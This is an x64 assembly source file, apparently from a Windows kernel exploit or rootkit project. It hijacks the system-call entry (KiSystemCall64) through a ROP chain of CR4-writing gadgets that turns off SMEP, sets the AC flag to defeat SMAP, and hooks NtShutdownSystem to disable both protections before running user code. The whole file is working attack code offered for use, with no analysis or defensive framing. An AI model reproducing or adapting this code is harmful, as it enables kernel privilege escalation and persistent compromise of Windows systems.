extern syscall_routine      : proc
extern shutdown_routine     : proc
extern cr4_smep_on          : dq
extern cr4_smep_off         : dq
extern sysret_gadget        : dq
extern mov_cr4_gadget       : dq
extern pop_rcx_gadget       : dq
extern syscall_gadget       : dq
extern gs_ursp_offset       : dq
extern gs_krsp_offset       : dq

.code
public syscall_wrapper
public shutdown_wrapper
public shutdown_wrapper_end

; This function replaces KiSystemCall64 and calls c++ routine.
syscall_stub proc
    swapgs
    mov rax, gs_ursp_offset
    mov gs:[rax], rsp
    mov rax, gs_krsp_offset
    mov rsp, gs:[rax]

    push r11                ; Save RFLAGS.
    mov rcx, r10            ; Restore first argument.

    sub rsp, 20h
    call syscall_routine
    add rsp, 20h

    pop r11                 ; Restore RFLAGS.

    mov rax, gs_ursp_offset
    mov rsp, gs:[rax]

    swapgs
    ret
syscall_stub endp

; Stack layout before the syscall.
; MSR_LSTAR is pointing to `pop rcx; ret` gadget.
;
; +──────────────────────+
; | cr4 with smep off    |
; +──────────────────────+
; | gadget mov cr4, rcx  |
; +──────────────────────+
; | syscall_stub         |
; +──────────────────────+
; | gadget pop rcx       |
; +──────────────────────+
; | cr4 with smep on     |
; +──────────────────────+
; | gadget mov cr4, rcx  |
; +──────────────────────+
; | pop rcx              |
; +──────────────────────+
; | exit                 |
; +──────────────────────+
; | gadget sysret        |
; +──────────────────────+
;
; The reason why we use ROP to enable smep back on is because once enabled, we can not
; execute in userspace memory.
;
syscall_wrapper proc
    push    r10
    pushfq
    mov     r10, rcx                ; Save first argument to restore after the syscall.

    push    sysret_gadget
    lea     rax, exit
    push    rax
    push    pop_rcx_gadget
    push    mov_cr4_gadget
    push    cr4_smep_on
    push    pop_rcx_gadget
    lea     rax, syscall_stub
    push    rax
    push    mov_cr4_gadget
    push    cr4_smep_off

    pushfq
    or      qword ptr [rsp], 040000h ; set AC bit. This will allow access to usermode stack even if `SMAP` bit is set in CR4.
    popfq

    syscall

exit:
    popfq
    pop r10
    ret
syscall_wrapper endp

; This function replaces NtShutdownSystem syscall and calls c++ routine.
shutdown_wrapper proc
    mov     rax, cr4
    push    rax                         ; Save original cr4 value.
    and     rax, 0ffffffffffcfffffh     ; disable SMEP and SMAP.
    mov     cr4, rax

    sub     rsp, 20h
    mov     rax, shutdown_routine
    call    rax
    add     rsp, 20h

    pop     rax                         ; Restore original cr4.
    mov     cr4, rax

    xor     rax, rax
    ret
shutdown_wrapper endp
; Indicates `shutdown_wrapper` end so we can calculate function size.
shutdown_wrapper_end proc
shutdown_wrapper_end endp
end
